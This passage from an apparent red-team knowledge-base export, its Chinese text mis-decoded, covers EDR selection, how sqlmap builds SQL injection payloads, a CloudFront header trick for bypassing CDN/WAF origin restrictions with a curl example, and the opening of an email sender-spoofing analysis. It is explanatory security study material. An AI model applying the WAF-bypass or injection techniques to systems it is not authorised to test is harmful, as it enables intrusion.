åŒ…å«ï¼šè¦†ç›–èŒƒå›´ã€è¯¯æŠ¥ç‡ã€æ¼æŠ¥ç‡ã€å“åº”æ—¶é—´ã€æœ‰æ•ˆæ€§ç­‰ã€‚\r\n- æä¾›ä»€ä¹ˆæ ·çš„å“åº”å¤„ç½®èƒ½åŠ›ï¼Ÿ\r\n  - éœ€è¦èƒ½å¤Ÿç«‹å³å¯¹å¨èƒåšå‡ºååº”å¹¶åœ¨å®ƒå¯¹æ‚¨çš„ç»„ç»‡é€ æˆæ›´å¤§æŸå®³ä¹‹å‰é˜»æ­¢å®ƒã€‚\r\n- æœ‰å“ªäº›ç±»å‹çš„æŠ¥å‘Šå¯ç”¨ï¼Ÿ\r\n  - EDR è§£å†³æ–¹æ¡ˆæä¾›çš„æŠ¥å‘Šå¯¹äºè·å¾—çš„ä»·å€¼è‡³å…³é‡è¦ï¼›è¿™é€‚ç”¨äºéšæ¯ä¸ªå¨èƒæ£€æµ‹æä¾›çš„æŠ¥å‘Šä»¥åŠæœ‰å…³ç»ˆç«¯å’Œä¼ä¸šçš„æ‘˜è¦æŠ¥å‘Šã€‚\r\n\r\n**å®‰å…¨èƒ½åŠ›æ•´åˆ**\r\n- æ˜¯å¦ä¸å…¶ä»–å®‰å…¨å·¥å…·é›†æˆ/è”åŠ¨ï¼Ÿ\r\n  - å°† EDR æ·±åº¦é›†æˆåˆ°ç°æœ‰çš„å®‰å…¨èƒ½åŠ›å’Œ IT å·¥å…·ï¼Œèƒ½å¤Ÿæœ€æœ‰æ•ˆåœ°ä»è§£å†³æ–¹æ¡ˆä¸­è·å¾—æœ€å¤§ä»·å€¼ã€‚\r\n- å¯¹ç»ˆç«¯ä¼šé€ æˆä»€ä¹ˆå½±å“?\r\n  - å‡ ä¹æ‰€æœ‰ EDR è§£å†³æ–¹æ¡ˆéƒ½é€šè¿‡Agentæ–¹å¼éƒ¨ç½²åˆ°ç»ˆç«¯ï¼Œè¿™æ„å‘³ç€å¦‚æœå®ƒæ²¡æœ‰ç»è¿‡è‰¯å¥½çš„è®¾è®¡å’Œæµ‹è¯•ï¼Œå¯èƒ½ä¼šäº§ç”Ÿä¸¥é‡çš„æ€§èƒ½å½±å“å¹¶å¯¼è‡´ä¸ç¨³å®šã€‚ åº”è¯¥æä¾›åœ¨ç±»ä¼¼æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ä¸Šæµ‹è¯•çš„æ€§èƒ½æ•°æ®ï¼Œä»¥åŠåœ¨è¿è¡Œç±»ä¼¼åº”ç”¨ç¨‹åºæ—¶çš„æ€§èƒ½æ•°æ®ã€‚\r\n- ä½¿ç”¨å“ªäº›å®‰å…¨æ§åˆ¶æ¥ä¿æŠ¤è‡ªå·±å…å—æ”»å‡»è€…çš„æ”»å‡»ï¼Ÿ\r\n  - å¦‚æœè®¾è®¡ä¸å½“ï¼ŒEDR è§£å†³æ–¹æ¡ˆå¯èƒ½ä¼šå¸¦æ¥å·¨å¤§çš„å®‰å…¨é£é™©ï¼›ç¡®ä¿EDRè‡ªèº«éƒ½æœ‰ä¸¥æ ¼çš„å®‰å…¨ç­–ç•¥ï¼Œå¹¶ç»è¿‡ç¬¬ä¸‰æ–¹æµ‹è¯•ã€‚\r\n- å‚å•†æä¾›å“ªäº›æ”¯æŒï¼Ÿ\r\n  - å‚å•†æä¾›çš„æŠ€æœ¯æ”¯æŒå°†æå¤§åœ°å½±å“æ½œåœ¨æˆæœ¬ä»¥åŠéƒ¨ç½²ã€æ’é™¤æ•…éšœå’Œä¼˜åŒ– EDR è§£å†³æ–¹æ¡ˆçš„èƒ½åŠ›ã€‚\r\n\r\n# 3. å‚è€ƒèµ„æ–™\r\n- [https://docs.google.com/viewerng/viewer?url=https://resource.redcanary.com/rs/003-YRU-314/images/EDR-Buyers-Guide-2020.pdf](https://docs.google.com/viewerng/viewer?url=https://resource.redcanary.com/rs/003-YRU-314/images/EDR-Buyers-Guide-2020.pdf)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red Teamèƒ½åŠ›å»ºè®¾/åˆå§‹è®¿é—® Initial Access/SQLæ³¨å…¥/SQLmap payloadç”Ÿæˆé€»è¾‘/","title":"SQLmap payloadç”Ÿæˆé€»è¾‘"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: SQLmap payloadç”Ÿæˆé€»è¾‘\r\ntags:\r\n- Red Teamèƒ½åŠ›å»ºè®¾\r\n- åˆå§‹è®¿é—® Initial Access\r\n- SQLæ³¨å…¥\r\n- SQLmap\r\n---\r\n\r\n# testå’Œboundaryç»„åˆç”Ÿæˆpayload\r\nè¿™éƒ¨åˆ†ä¸»è¦æ¢³ç†sqlmapç”Ÿæˆpayloadçš„æ–¹å¼ï¼Œsqlmapæ‰«æè§„åˆ™æ–‡ä»¶ä½äºxmlæ–‡ä»¶å¤¹ä¸­çš„boundaries.xmlæ–‡ä»¶å’Œpayloadsæ–‡ä»¶å¤¹ï¼Œpayloadsæ–‡ä»¶å¤¹ä¸­å­˜æ”¾äº†å…­ç§æ³¨å…¥ç±»å‹çš„xmlæ–‡ä»¶ã€‚\r\n\r\n- boolean_blind\r\n- error_based\r\n- inline_query\r\n- stacked_queries\r\n- time_blind\r\n- union_query\r\n\r\næœ€ç»ˆpayloadçš„ç”Ÿæˆæ–¹å¼ä¸º: prefix + payload + comment + suffix, å…¶ä¸­prefixå’Œsuffixç”±boundariesä¸­çš„å­èŠ‚ç‚¹prefixå’Œsuffixæä¾›ï¼Œpayloadå’Œcommentç”±payloadsæ–‡ä»¶å¤¹ä¸­çš„testçš„å­èŠ‚ç‚¹payloadå’Œcommentæä¾›ã€‚\r\n\r\n# è§£ætest\r\ntestèŠ‚ç‚¹çš„æ ¼å¼å¦‚ä¸‹ï¼š\r\n\r\n```\r\n  <test>\r\n      <title></title>\r\n      <stype></stype>\r\n      <level></level>\r\n      <risk></risk>\r\n      <clause></clause>\r\n      <where></where>\r\n      <vector></vector>\r\n      <request>\r\n          <payload></payload>\r\n          <comment></comment>\r\n          <char></char>\r\n          <columns></columns>\r\n      </request>\r\n      <response>\r\n          <comparison></comparison>\r\n          <grep></grep>\r\n          <time></time>\r\n          <union></union>\r\n      </response>\r\n      <details>\r\n          <dbms></dbms>\r\n          <dbms_version></dbms_version>\r\n          <os></os>\r\n      </details>\r\n  </test>\r\n```\r\n\r\n- title\r\n  - å½“å‰æµ‹è¯•Payloadçš„æ ‡é¢˜ï¼Œé€šè¿‡æ ‡é¢˜å¯ä»¥äº†è§£å½“å‰çš„æ³¨å…¥ç±»å‹ä»¥åŠæµ‹è¯•çš„æ•°æ®åº“ç±»å‹\r\n- stype\r\n  - SQLæ³¨å…¥çš„ç±»å‹, å¯èƒ½çš„å€¼å’Œä»£è¡¨çš„æ„ä¹‰å¦‚ä¸‹\r\n    - Boolean-based blind SQL injection\r\n    - Error-based queries SQL injection\r\n    - Inline queries SQL injection\r\n    - Stacked queries SQL injection\r\n    - Time-based blind SQL injection\r\n    - UNION query SQL injection\r\n- level\r\n  - æµ‹è¯•SQLæ³¨å…¥çš„æ·±åº¦ï¼Œå…±æœ‰5ä¸ªçº§åˆ«ï¼Œçº§åˆ«è¶Šé«˜å‘é€çš„è¯·æ±‚æ•°è¶Šå¤šã€‚è¿™å’Œboundaryå­èŠ‚ç‚¹levelçš„å«ä¹‰æ˜¯ä¸€è‡´çš„\r\n    - Always (<100 requests)\r\n    - Try a bit harder (100-200 requests)\r\n    - Good number of requests (200-500 requests)\r\n    - Extensive test (500-1000 requests)\r\n    - You have plenty of time (>1000 requests)\r\n- risk\r\n  - æµ‹è¯•payloadç ´åæ•°æ®å®Œæ•´æ€§çš„å¯èƒ½æ€§ã€‚\r\n    - Low risk\r\n    - Medium risk\r\n    - High risk\r\n- clause[å¤šä¸ªå€¼ç”¨,åˆ†éš”]\r\n  - payloadåœ¨å“ªä¸ªå­—æ®µä½ç½®ç”Ÿæ•ˆ, è¿™å’Œboundaryå­èŠ‚ç‚¹clauseçš„å«ä¹‰æ˜¯ä¸€è‡´çš„\r\n    - Always\r\n    - WHERE / HAVING\r\n    - GROUP BY\r\n    - ORDER BY\r\n    - LIMIT\r\n    - OFFSET\r\n    - TOP\r\n    - Table name\r\n    - Column name\r\n    - Pre-WHERE (non-query)\r\n- where[å¤šä¸ªå€¼ç”¨,åˆ†éš”]\r\n  - æ·»åŠ å®Œæ•´payload`<prefix>`,`<payload>`,`<comment>`,`<suffix>`çš„åœ°æ–¹, è¿™å’Œboundaryå­èŠ‚ç‚¹whereçš„å«ä¹‰æ˜¯ä¸€è‡´çš„\r\n  - Append the string to the parameter original value\r\n  - Replace the parameter original value with a negative random integer value and append our string\r\n  - Replace the parameter original value with our string\r\n- vector\r\n  - æ³¨å…¥å‘é‡\r\n- request\r\n  - æ³¨å…¥æµ‹è¯•å‘é€çš„è¯·æ±‚\r\n    - payload\r\n      - æµ‹è¯•ä½¿ç”¨çš„payload, å…¶ä¸­çš„[RANDNUM]ï¼Œ[DELIMITER_STAR]ï¼Œ[DELIMITER_STOP]åˆ†åˆ«ä»£è¡¨ç€éšæœºæ•°å€¼ä¸å­—ç¬¦, æ‰«ææ—¶ä¼šç”¨å¯¹åº”çš„éšæœºæ•°æ›¿æ¢æ‰ã€‚\r\n    - comment\r\n      - æ·»åŠ åœ¨payloadåé¢çš„æ³¨é‡Š\r\n    - char\r\n      - åœ¨unionæ³¨å…¥æµ‹è¯•ä¸­æš´åŠ›ç ´è§£åˆ—æ•°æ‰€ä½¿ç”¨çš„å­—ç¬¦\r\n    - columns\r\n      - åœ¨unionæ³¨å…¥æµ‹è¯•ä¸­æµ‹è¯•åˆ—çš„èŒƒå›´ï¼Œ å¦‚<columns>[COLSTART]-[COLSTOP]</columns>\r\n- response\r\n  - ä»å“åº”ä¸­è¯†åˆ«æ˜¯å¦æˆåŠŸæ³¨å…¥\r\n    - comparison(å¸ƒå°”ç›²æ³¨)\r\n      - åº”ç”¨æ¯”è¾ƒç®—æ³•ï¼Œæ¯”è¾ƒä¸¤æ¬¡è¯·æ±‚å“åº”çš„ä¸åŒï¼Œä¸€æ¬¡è¯·æ±‚çš„payloadä½¿ç”¨requestå­èŠ‚ç‚¹ä¸­çš„payload, å¦ä¸€æ¬¡è¯·æ±‚çš„payloadä½¿ç”¨responseå­èŠ‚ç‚¹ä¸­çš„comparison\r\n    - grep(æŠ¥é”™æ³¨å…¥)\r\n      - å“åº”ä¸­åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼\r\n    - time(æ—¶é—´ç›²æ³¨å’Œå †å æ³¨å…¥)\r\n      - å“åº”è¿”å›ä¹‹å‰ç­‰å¾…çš„æ—¶é—´(å•ä½ä¸ºç§’)\r\n    - union(unionæ³¨å…¥)\r\n      - è°ƒç”¨ unionTest()å‡½æ•°\r\n- details\r\n  - æ³¨å…¥æˆåŠŸèƒ½å¾—åˆ°çš„å…³äºæ“ä½œç³»ç»Ÿå’Œæ•°æ®åº“ç›¸å…³çš„ä¿¡æ¯\r\n    - dbms\r\n  - ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹\r\n    - dbms_version\r\n  - æ•°æ®åº“ç‰ˆæœ¬\r\n    - os\r\n  - è¿è¡Œæ•°æ®åº“å¾—æ“ä½œç³»ç»Ÿ\r\n\r\n# è§£æboundaries\r\nboundaryèŠ‚ç‚¹çš„æ ¼å¼å¦‚ä¸‹:\r\n\r\n```\r\n  <boundary>\r\n      <level></level>\r\n      <clause></clause>\r\n      <where></where>\r\n      <ptype></ptype>\r\n      <prefix></prefix>\r\n      <suffix></suffix>\r\n  </boundary>\r\n```\r\n\r\nå…¶ä¸­`level`, `clause`, `where`è¡¨ç¤ºçš„å«ä¹‰å’ŒtestèŠ‚ç‚¹ä¸­æ‰€è¡¨ç¤ºçš„å«ä¹‰æ˜¯ä¸€è‡´çš„ã€‚\r\n\r\n- ptype\r\n  - æµ‹è¯•å‚æ•°çš„ç±»å‹\r\n    - Unescaped numeric\r\n    - Single quoted string\r\n    - LIKE single quoted string\r\n    - Double quoted string\r\n    - LIKE double quoted string\r\n- prefix\r\n  - ``<payload>``,``<comment>``æ·»åŠ çš„å‰ç¼€\r\n- suffix\r\n  - `<payload>`,`<comment>`æ·»åŠ çš„åç¼€\r\n\r\n# æºç è§£æpayloadç»„åˆ\r\nsqlmapä½¿ç”¨`lib/controller/checks.py`æ–‡ä»¶ä¸­çš„`checkSqlInjection()`å‡½æ•°è¿›è¡Œsqlæ³¨å…¥çš„æµ‹è¯•, å…¶ä¸­åˆ©ç”¨testå’Œboundaryç”Ÿæˆpayloadçš„ä¸»è¦ä»£ç å¦‚ä¸‹ï¼Œå¿½ç•¥å…¶ä»–é€»è¾‘åˆ¤æ–­\r\n\r\n```\r\n  # Favoring non-string specific boundaries in case of digit-like parameter values\r\n  if value.isdigit():\r\n      kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or \"\") or _ in (boundary.suffix or \"\") for _ in ('\"', '\\'')))\r\n      boundaries = kb.cache.intBoundaries\r\n  else:\r\n      boundaries = conf.boundaries\r\n  \r\n  tests = getSortedInjectionTests()\r\n  \r\n  while tests:\r\n      test = tests.pop(0)\r\n  \r\n      for boundary in boundaries:\r\n          injectable = False\r\n  \r\n          # Skip boundary if it does not match against test's <clause>\r\n          # Parse test's <clause> and boundary's <clause>\r\n          clauseMatch = False\r\n  \r\n          for clauseTest in test.clause:\r\n              if clauseTest in boundary.clause:\r\n                  clauseMatch = True\r\n                  break\r\n  \r\n          if test.clause != [0] and boundary.clause != [0] and not clauseMatch:\r\n              continue\r\n  \r\n          # Skip boundary if it does not match against test's <where>\r\n          # Parse test's <where> and boundary's <where>\r\n          whereMatch = False\r\n  \r\n          for where in test.where:\r\n              if where in boundary.where:\r\n                  whereMatch = True\r\n                  break\r\n  \r\n          if not whereMatch:\r\n              continue\r\n  \r\n          # For each test's <where>\r\n          for where in test.where:\r\n              # generage payload\r\n              templatePayload = agent.payload(..., where=where)\r\n```\r\n\r\nåˆ©ç”¨testå’Œboundaryç”Ÿæˆpayloadçš„æµç¨‹ä¸º:\r\n\r\n- å¾ªç¯éå†æ¯ä¸€ä¸ªtest,\r\n- å¯¹æŸä¸ªtest,å¾ªç¯éå†boundary\r\n- è‹¥boundaryçš„whereåŒ…å«testçš„whereå€¼ï¼Œå¹¶ä¸”boundaryçš„clauseåŒ…å«testçš„clauseå€¼, åˆ™boundaryå’Œtestå¯ä»¥åŒ¹é…\r\n- å¾ªç¯testçš„whereå€¼,ç»“åˆåŒ¹é…çš„boundaryç”Ÿæˆç›¸åº”çš„payload\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/](http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red Teamèƒ½åŠ›å»ºè®¾/åˆå§‹è®¿é—® Initial Access/ç»•è¿‡ Bypass/ç»•è¿‡CDN WAFé˜²æŠ¤/","title":"ç»•è¿‡CDN WAFé˜²æŠ¤"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ç»•è¿‡CDN WAFé˜²æŠ¤\r\ntags:\r\n- Red Teamèƒ½åŠ›å»ºè®¾\r\n- åˆå§‹è®¿é—® Initial Access\r\n- ç»•è¿‡ Bypass\r\n---\r\n\r\n# æ‰¾åˆ°æºä¸»æœºIP\r\nè®°çš„å¾ˆä¹…ä¹‹å‰åœ¨ä¹Œäº‘ä¸Šçœ‹åˆ°ç¯‡æ–‡ç« ï¼Œé€šè¿‡ä½¿ç”¨ zmap å¯¹å…¨ CN çš„ IP çš„ 80ã€443 ç«¯å£è¿›è¡Œæ‰«æï¼Œé€šè¿‡bannerå¯¹æ¯”å¾—åˆ°çœŸå®IPã€‚\r\n\r\nä¸Šé¢çš„æ–¹æ¡ˆæ˜¯æœ‰ä¸€å®šçš„ç¼ºé™·çš„ï¼š\r\n\r\n1. æ— æ³•å¯¹å“åº”åšåŒ¹é…ï¼Œä¸”å­—ç¬¦ä¸²åŒ¹é…å¯èƒ½ä¸å‡†ç¡®\r\n2. æºç«™åªå…è®¸CDNè®¿é—®ï¼Œæ— æ³•ç›´æ¥è®¿é—®æ€ä¹ˆåŠï¼Ÿ\r\n\r\n## é—®é¢˜ä¸€ï¼šä½¿ç”¨å·¥å…·Hakoriginfinder\r\nHakoriginfinder æ˜¯ä¸€ä¸ª golang å·¥å…·ï¼Œå®ƒä¼šå‘æ¯ä¸ª IP åœ°å€å‘å‡º HTTP å’Œ HTTPS è¯·æ±‚ï¼Œå°è¯•é€šè¿‡å°†å“åº”ä¸çœŸå®ç½‘ç«™çš„å“åº”è¿›è¡Œæ¯”è¾ƒæ¥æ‰¾åˆ°æºä¸»æœºï¼Œå¹¶ä¸”ä½¿ç”¨ Levenshtein ç®—æ³•æ‰¾åˆ°ç›¸ä¼¼çš„å“åº”ã€‚\r\n\r\né€Ÿåº¦è‚¯å®šä¸å¦‚zmapé‚£ä¹ˆå¿«ã€‚\r\n\r\n- https ://github.com/hakluke/hakoriginfinder\r\n\r\n## é—®é¢˜äºŒï¼šä½¿ç”¨CDNåŸºç¡€è®¾æ–½æ¥ç»•è¿‡é™åˆ¶\r\nä»¥AWSç¯å¢ƒä¸ºä¾‹\r\n\r\n- CloudFlare å’Œ CloudFront ç­‰CDNæœåŠ¡ï¼Œä¼šä½¿ç”¨å…±äº«çš„ IP èŒƒå›´æ¥å¯¹æºç«™è¿›è¡Œè®¿é—®\r\n- ä½¿ç”¨CloudFrontæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨HTTPè¯·æ±‚æ·»åŠ ä»»æ„header\r\n\r\nè¿™äº›æ¡ä»¶å¯ä»¥ç»•è¿‡é—®é¢˜äºŒæåˆ°çš„é™åˆ¶ï¼Œæ–¹æ³•æ˜¯é€šè¿‡æ§åˆ¶çš„ä¸€ä¸ªè·¯ç”±ï¼Œè¿™ä¸ªæœªç»è¿‡æ»¤çš„è¯·æ±‚å¯ä»¥ç»•è¿‡æºå¤´çš„ä»»ä½• IP é™åˆ¶ï¼Œå› ä¸ºå®ƒæ¥è‡ªä¸åˆæ³•è¯·æ±‚ç›¸åŒçš„ IP èŒƒå›´ï¼Œå¦‚ä¸‹å›¾ï¼š\r\n\r\n- ![36gDd6](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/36gDd6.jpg)\r\n\r\nè¿™é‡Œçš„æ ¸å¿ƒæ¶‰åŠAWS CDNä½¿ç”¨çš„HTTP headerå­—æ®µ\r\n\r\n- **Cdn-Proxy-Origin**, æ­¤å­—æ®µæ˜¯å¿…å¡«çš„ï¼Œéœ€è¦è®¾ç½®ä¸ºé€šè¿‡ CloudFront è½¬å‘åï¼Œè·¯ç”±è¦åˆ°è¾¾ç›®æ ‡çš„ä¸»æœºåæˆ–IP\r\n- **Cdn-Proxy-Host**, æ­¤å­—æ®µæ˜¯å¯é€‰çš„ï¼Œå†…å®¹ä¸ºé€šè¿‡ CloudFront è½¬å‘åï¼ŒHost å­—æ®µçš„å€¼ï¼Œå¦‚æœæœªè®¾ç½®ï¼Œå®ƒå°†é»˜è®¤ä¸º Cdn-Proxy-Origin çš„å€¼\r\n- **X-Forwarded-For**, æ­¤å­—æ®µæ˜¯å¯é€‰çš„ï¼Œå†…å®¹ä¸ºé€šè¿‡ CloudFront è½¬å‘åï¼ŒHTTP headerä¸­çš„xffå­—æ®µï¼Œå¦‚æœæœªè®¾ç½®ï¼Œåˆ™ä¸ºä¸€ä¸ªéšæœºIP\r\n\r\næ¯”å¦‚ï¼Œä¸‹é¢çš„è¯·æ±‚é€šè¿‡ CloudFront åè½¬å‘åˆ°å…¬å…± ifconfig.me æœåŠ¡ï¼Œè¿”å›çš„ IP å°†æ˜¯æˆ‘ä»¬ä» CloudFront ç½‘ç»œå‘å‡ºçš„è¯·æ±‚çš„æº IP\r\n\r\n```\r\n  curl -H 'Cdn-Proxy-Origin: ifconfig.me' -H 'Cdn-Proxy-Host: ifconfig.me' XXXXXXXXXXXXX.cloudfront.net\r\n```\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html](https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red Teamèƒ½åŠ›å»ºè®¾/åˆå§‹è®¿é—® Initial Access/é’“é±¼ Phishing/DataCon2021ä¼˜ç§€è§£é¢˜æ€è·¯åˆ†äº«-é‚®ä»¶å‘ä»¶äººä¼ªé€ ï¼ˆæ­¦æ±‰å¤§å­¦ 10TGï¼‰/","title":"DataCon2021ä¼˜ç§€è§£é¢˜æ€è·¯åˆ†äº«-é‚®ä»¶å‘ä»¶äººä¼ªé€ ï¼ˆæ­¦æ±‰å¤§å­¦ 10TGï¼‰"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: DataCon2021ä¼˜ç§€è§£é¢˜æ€è·¯åˆ†äº«-é‚®ä»¶å‘ä»¶äººä¼ªé€ ï¼ˆæ­¦æ±‰å¤§å­¦ 10TGï¼‰\r\ntags:\r\n- Red Teamèƒ½åŠ›å»ºè®¾\r\n- åˆå§‹è®¿é—® Initial Access\r\n- é’“é±¼\r\n- SMTP\r\n---\r\n\r\n# èƒŒæ™¯\r\né‚®ä»¶å‘ä»¶åè®®ä¸»è¦æ˜¯SMTP(Simple Mail Transfer Protocol)ï¼Œä½†æ˜¯SMTPåè®®è®¾è®¡ä¹‹åˆå¹¶æ²¡æœ‰è€ƒè™‘åˆ°å¤ªå¤šå®‰å…¨ç›¸å…³çš„åŠŸèƒ½ï¼Œå› æ­¤å¯¼è‡´é‚®ä»¶å‘ä»¶äººä¼ªé€ çš„æ”»å‡»å±‚å‡ºä¸ç©·ã€‚\r\n\r\nä¸€ä¸ªå…¸å‹çš„é‚®ä»¶ä»å‘é€æ–¹ç¼–å†™åˆ°æ¥æ”¶æ–¹çœ‹åˆ°é‚®ä»¶å†…å®¹çš„è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º\r\n\r\n![5htp7U](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/5htp7U.jpg)\r\n\r\n- å‘é€æ–¹é€šè¿‡SMTPåè®®å‘ç»™å‘é€æ–¹çš„MTA(Mail Transmission Agent)\r\n- å‘é€æ–¹çš„MTAé€šè¿‡SMTPåè®®å‘ç»™æ¥æ”¶æ–¹çš„MTA\r\n- æœ€ç»ˆæ¥æ”¶æ–¹ä½¿ç”¨POP3(Post Office Protocol)æˆ–IMAP(Internet Message Access Protocol)åè®®æ¥æ”¶é‚®ä»¶\r\n\r\nåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼ è¾“çš„é‚®ä»¶æœ‰å¾ˆå¤šä¸ªå­—æ®µéƒ½æ˜¯ç”¨æ¥æŒ‡å®šå‘é€æ–¹èº«ä»½çš„\r\n\r\n- MailFrom SMTP.From, è¿™ä¸ªå­—æ®µå¯ä»¥ç†è§£ä¸ºä¿¡å°ä¸ŠæŒ‡å®šçš„å‘ä»¶äºº\r\n- From Message.From, å±•ç¤ºç»™ç”¨æˆ·çœ‹åˆ°çš„ä¿¡æ¯ä¸Šçš„å‘ä»¶äºº\r\n- Sender, ä¸€èˆ¬åœ¨ä»£å‘é‚®ä»¶ä¸­ç”¨æ¥æ ‡è¯†ä»£å‘é‚®ä»¶çš„æ¥æº\r\n\r\nè¿™äº›å¤šç§çš„å­—æ®µå°±å¯¼è‡´å®é™…é‚®ä»¶æœåŠ¡è§£ææ—¶ä¸åŒé‚®ä»¶å®¢æˆ·ç«¯å¯èƒ½å¯¹æ˜¾ç¤ºçš„å†…å®¹å¤„ç†æ–¹æ¡ˆä¸åŒï¼Œä»è€Œå°±å¯¼è‡´äº†å‘ä»¶äººä¼ªé€ çš„æ”»å‡»ã€‚\r\n\r\nè¿™ç§æ”»å‡»ä¹Ÿåœ¨APTã€é’“é±¼é‚®ä»¶ç­‰æ”»å‡»ä¸­å¤§é‡å­˜åœ¨ï¼Œå› æ­¤å‘ä»¶äººä¼ªé€ æ”»å‡»ä¹Ÿæ˜¯ä¸€ä¸ªååˆ†å€¼å¾—é‡è§†çš„é‚®ä»¶å®‰å…¨é—®é¢˜ã€‚\r\n\r\n# é‚®ä»¶å®‰å…¨åè®®\r\nç”±äºSMTPè®¾è®¡æ—¶å¹¶æ²¡æœ‰è€ƒè™‘ç›¸å…³çš„å®‰å…¨æœºåˆ¶ï¼Œä¸ºäº†ä¿è¯å…¶å®‰å…¨æ€§é™†ç»­æ¨å‡ºäº†SPFã€DKIMã€DMARCç­‰å®‰å…¨åè®®ã€‚\r\n\r\nå¯¹äºå‘ä»¶äººä¼ªé€ æ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯è¿™äº›åè®®åˆ†åˆ«æ£€æŸ¥å“ªäº›å­—æ®µï¼Œå¦‚ä½•åˆ©ç”¨åè®®çš„ç¼ºé™·ç»•è¿‡å¯¹åº”çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶\r\n\r\n- SPF\r\n  - ![bVMdw7](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bVMdw7.jpg)\r\n  - SPFåè®®æ˜¯å‘ä»¶äººçš„åŸŸååœ¨DNSè®°å½•ä¸­åŠ å…¥ä¸€æ¡TXTè®°å½•ï¼Œå…¶ä¸­åŒ…å«å…è®¸çš„IPåœ°å€ï¼›\r\n  - æ”¶ä»¶æ–¹æ¥æ”¶åˆ°é‚®ä»¶åæ£€æŸ¥smtp.mailå­—æ®µï¼Œå¦‚æœå‘ä»¶äººçš„IPåœ¨DNSçš„TXTè®°å½•ä¸­ï¼Œåˆ™è¿”å›pass\r\n- DKIM\r\n  - ![oG2tLv](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/oG2tLv.jpg)\r\n  - DKIMæ˜¯åˆ©ç”¨åˆ°å¯†ç å­¦çš„ç­¾ååè®®ï¼Œå‘ä»¶æ–¹é¦–å…ˆéœ€è¦åœ¨DNSè®°å½•ä¸Šå¢åŠ è‡ªå·±çš„å…¬é’¥ï¼Œå‘ä»¶æ—¶ä½¿ç”¨è‡ªå·±çš„ç§é’¥å¯¹é‚®ä»¶çš„å†…å®¹è¿›è¡Œç­¾åï¼Œå¹¶å°†ç­¾åçš„ç»“æœå†™åœ¨é‚®ä»¶å†…å®¹ä¸­ï¼Œå½“æ”¶ä»¶äººæ”¶åˆ°ä¿¡ä»¶æ—¶å‘DNSè¯·æ±‚å…¬é’¥å¯¹ä¿¡ä»¶å†…å®¹è¿›è¡Œæ ¡éªŒã€‚\r\n  - DKIMä¸­å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µæœ‰ï¼š\r\n    - d è¡¨ç¤ºå®é™…æ ¡éªŒçš„åŸŸå\r\n    - h è¡¨ç¤ºç­¾åå†…å®¹çš„æ¶µç›–èŒƒå›´\r\n    - l æ˜¯å¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºbodyçš„é•¿åº¦\r\n  - å…¶ä¸­lè¿™ä¸ªå‚æ•°æœ€åˆçš„ç›®çš„æ˜¯ç”¨äºä¸€äº›å•†ä¸šé‚®ä»¶åº•éƒ¨çš„Unsubscribeç›¸å…³æŒ‰é’®\r\n  - æŒ‡å®šäº†lå‚æ•°çš„é‚®ä»¶æœ‰å¯èƒ½è¢«ä¼ªé€ body\r\n- DMAR\r\n  - ![bKrOgm](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bKrOgm.jpg)\r\n  - ç”±äºSPFåè®®åªèƒ½ä¿è¯å‘ä»¶äººçš„IPæ˜¯å¦æ˜¯åŸŸåå…è®¸çš„IPï¼ŒDKIMåªèƒ½ä¿è¯é‚®ä»¶çš„å†…å®¹æ²¡æœ‰ç»è¿‡ç¯¡æ”¹ï¼Œä¸¤è€…éƒ½æ²¡æœ‰ä¿æŠ¤æœ€ç»ˆæ”¶ä»¶äººçœ‹åˆ°çš„Fromå­—æ®µæ˜¯å¦æ˜¯ä¸€ä¸ªæ­£ç¡®ä¸”çœŸå®çš„ï¼Œå› æ­¤å¢åŠ äº†DMARCåè®®ã€‚\r\n  - DMARCåè®®ä¼šæ ¹æ®SPFã€DKIMä¸¤è€…éªŒè¯çš„è¿”å›ç»“æœï¼Œä»¥åŠå¯¹Fromå­—æ®µåšçš„**ä¸€è‡´æ€§æ£€æŸ¥**ï¼Œæœ€ç»ˆç»™å‡ºä¸€ä¸ªç»“è®ºï¼Œåˆ¤æ–­è¿™å°é‚®ä»¶æ˜¯åº”å½“æ‹’æ”¶è¿˜æ˜¯æ¥æ”¶ã€‚\r\n\r\n# å‘ä»¶äººä¼ªé€ å¸¸è§æ”»å‡»ç±»å‹\r\n![3FxZc2](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/3FxZc2.jpg)\r\n\r\n2021å¹´USENIXçš„è®ºæ–‡ä¸­æå‡ºäº†Direct MTAã€Shared MTAã€Forwarding 